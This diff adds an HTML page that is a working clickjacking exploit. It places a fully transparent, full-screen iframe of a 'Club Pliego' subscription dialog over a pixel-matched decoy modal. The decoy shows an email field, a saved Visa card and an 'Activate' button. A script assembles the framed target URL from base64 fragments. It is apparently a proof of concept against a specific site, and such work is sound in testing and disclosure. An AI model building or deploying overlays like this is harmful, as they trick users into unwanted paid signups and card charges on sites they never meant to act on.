@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Club Pliego — Free Month</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root { --bg: #f5f3ea; --ink: #22251e; --muted: #53564d; --line: #c8c6bc; --surf: #fff; }
+body { font-family: 'Inter', Arial, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
+
+/* ── INVISIBLE IFRAME — Club Pliego activation, full viewport, intercepts all input ── */
+#victim-frame {
+  position: fixed; inset: 0; width: 100%; height: 100%;
+  border: none; opacity: 0; z-index: 100; pointer-events: auto;
+}
+
+/* ── SITE HEADER ── */
+.site-header {
+  position: fixed; top: 0; left: 0; right: 0; height: 64px;
+  display: flex; align-items: center; padding: 0 48px;
+  background: var(--bg); border-bottom: 1px solid var(--ink); z-index: 3;
+}
+.site-name { font-size: 22px; font-weight: 700; letter-spacing: -.04em; }
+.site-nav { margin-left: auto; display: flex; gap: 24px; }
+.site-nav a { font-size: 13px; font-weight: 500; color: var(--ink); text-decoration: none; }
+
+/* ── ARTICLE BODY ── */
+.article {
+  max-width: 640px; margin: 0 auto;
+  padding: 110px 24px 200px;
+}
+.article-eyebrow {
+  font-size: 11px; font-weight: 700; letter-spacing: .1em; text-transform: uppercase;
+  color: var(--muted); margin-bottom: 14px;
+}
+.article h1 {
+  font-size: 36px; font-weight: 700; line-height: 1.18;
+  letter-spacing: -.025em; margin-bottom: 16px;
+  font-family: Georgia, serif;
+}
+.article p {
+  font-size: 15px; line-height: 1.75; color: var(--muted);
+  margin-bottom: 16px;
+}
+
+/* ── BACKDROP — same as Pliego's dialog::backdrop ── */
+.modal-backdrop {
+  position: fixed; inset: 0;
+  background: rgba(32, 32, 24, 0.47);
+  z-index: 2;
+}
+
+/* ── DECOY DIALOG — matches Pliego's <dialog> at all viewport sizes ── */
+/*
+  Pliego dialog is `showModal()` centered: left=(vw-500)/2, top=(vh-466.6)/2
+  Internal offsets (from devtools at 1808x875):
+    email input:  left+29, top+137, w:442, h:46
+    activate btn: left+35, top+358, w:95,  h:40
+    email label:  left+28, top+109
+    card row:     left+29, top+267, w:442, h:67
+    "first month" text: left+28, top+193
+*/
+.modal-box {
+  position: fixed;
+  left: calc(50vw - 250px);
+  top: calc(50vh - 233px);
+  width: 500px;
+  height: 466.6px;
+  background: var(--bg);
+  border: 1px solid var(--ink);
+  padding: 28px;
+  z-index: 2;
+  pointer-events: none;
+}
+.modal-close {
+  position: fixed;
+  right: calc(50vw - 250px + 12px);
+  top: calc(50vh - 233px + 12px);
+  width: 32px; height: 32px;
+  border: 1px solid var(--ink); border-radius: 50%;
+  background: transparent;
+  font-size: 16px; color: var(--ink);
+  z-index: 2; pointer-events: none;
+  display: flex; align-items: center; justify-content: center;
+}
+.modal-title {
+  position: fixed;
+  left: calc(50vw - 222px);
+  top: calc(50vh - 205px);
+  font-family: Georgia, serif;
+  font-size: 28px; font-weight: 400;
+  color: var(--ink);
+  z-index: 2; pointer-events: none;
+}
+
+/* email label: dialog_top+109 → 50vh-233+109 = 50vh-124 */
+.email-label {
+  position: fixed;
+  left: calc(50vw - 222px);
+  top: calc(50vh - 124px);
+  font-size: 14px; font-weight: 400; color: var(--ink);
+  z-index: 2; pointer-events: none;
+}
+
+/* email input: dialog_top+137 → 50vh-233+137 = 50vh-96 */
+.fake-email-input {
+  position: fixed;
+  left: calc(50vw - 221px);
+  top: calc(50vh - 96px);
+  width: 442px; height: 46px;
+  background: var(--surf);
+  border: 1px solid var(--ink);
+  padding: 0 12px;
+  font-family: inherit; font-size: 14px; color: var(--muted);
+  display: flex; align-items: center;
+  z-index: 2; pointer-events: none;
+}
+
+/* "first month" text: dialog_top+193 → 50vh-233+193 = 50vh-40 */
+.modal-text {
+  position: fixed;
+  left: calc(50vw - 222px);
+  top: calc(50vh - 40px);
+  width: 442px;
+  font-size: 14px; color: var(--ink); line-height: 1.55;
+  z-index: 2; pointer-events: none;
+}
+
+/* card row: dialog_top+267 → 50vh-233+267 = 50vh+34 */
+.fake-card {
+  position: fixed;
+  left: calc(50vw - 221px);
+  top: calc(50vh + 34px);
+  width: 442px; height: 67px;
+  background: var(--surf);
+  border: 1px solid var(--line);
+  border-radius: 8px;
+  display: flex; align-items: center; gap: 14px;
+  padding: 0 16px;
+  z-index: 2; pointer-events: none;
+}
+.card-brand {
+  font: italic 700 15px Arial, sans-serif;
+  color: #203475; background: #fff;
+  border: 1px solid #d3d3ca; border-radius: 4px;
+  padding: 6px 8px;
+}
+
+/* activate btn: dialog_top+358 → 50vh-233+358 = 50vh+125 */
+.fake-activate-btn {
+  position: fixed;
+  left: calc(50vw - 215px);
+  top: calc(50vh + 125px);
+  width: 95px; height: 40px;
+  background: var(--ink); color: var(--bg);
+  border: none; border-radius: 30px;
+  font-family: inherit; font-size: 14px; font-weight: 600;
+  display: flex; align-items: center; justify-content: center;
+  z-index: 2; pointer-events: none;
+}
+
+/* T&C note: dialog_top+410 → 50vh-233+410 = 50vh+177 */
+.modal-tnc {
+  position: fixed;
+  left: calc(50vw - 222px);
+  top: calc(50vh + 177px);
+  width: 444px;
+  font-size: 11px; color: var(--muted); line-height: 1.5;
+  z-index: 2; pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Club Pliego activation — invisible, full-viewport, intercepts all input/clicks -->
+<iframe id="victim-frame" src="about:blank" aria-hidden="true" tabindex="-1"></iframe>
+
+<header class="site-header">
+  <span class="site-name">Pliego.</span>
+  <nav class="site-nav">
+    <a href="#">Collection</a>
+    <a href="#">Club Pliego</a>
+  </nav>
+</header>
+
+<!-- backdrop -->
+<div class="modal-backdrop"></div>
+
+<!-- decoy dialog, visually matches Pliego's Club Pliego modal -->
+<div class="modal-box"></div>
+<div class="modal-close">×</div>
+<div class="modal-title">Club Pliego</div>
+
+<div class="email-label">Email address</div>
+<input class="fake-email-input" type="email" placeholder="your@email.com"
+  aria-label="Email address for Club Pliego" tabindex="0" />
+
+<div class="modal-text">Your first month is free. We'll send confirmation to your email address.</div>
+
+<div class="fake-card">
+  <span class="card-brand">VISA</span>
+  <div>
+    <div style="font-weight:600; font-size:14px;">Visa •••• 4242</div>
+    <div style="font-size:12px; color:var(--muted);">Default card</div>
+  </div>
+</div>
+
+<button class="fake-activate-btn" tabindex="0">Activate</button>
+
+<div class="modal-tnc">
+  By signing up, you agree to the <strong>terms and conditions (PDF)</strong>.
+</div>
+
+<!-- article behind the modal -->
+<div class="article">
+  <div class="article-eyebrow">Club Pliego</div>
+  <h1>The art of<br>collecting.</h1>
+  <p>
+    Enjoy your first month of access to the club's digital prints for free.
+    Club Pliego members get exclusive access to the full print collection
+    with new releases every month.
+  </p>
+  <p>
+    Terracotta Orbit, Cobalt Rhythm, Clay Sun — and more added each month.
+    Activate your free trial with just your email address.
+  </p>
+</div>
+
+<script>
+// Assemble Club Pliego activation URL at runtime from base64 fragments
+setTimeout(function() {
+  var p = [
+    'aHR0cHM6Ly9wbGll',
+    'Z28tbGVuMy5vbnJl',
+    'bmRlci5jb20vP2pv',
+    'aW49MQ=='
+  ];
+  document.getElementById('victim-frame').src = atob(p.join(''));
+}, 500);
+// base64 decodes to: https://pliego-len3.onrender.com/?join=1
+</script>
+
+</body>
+</html>
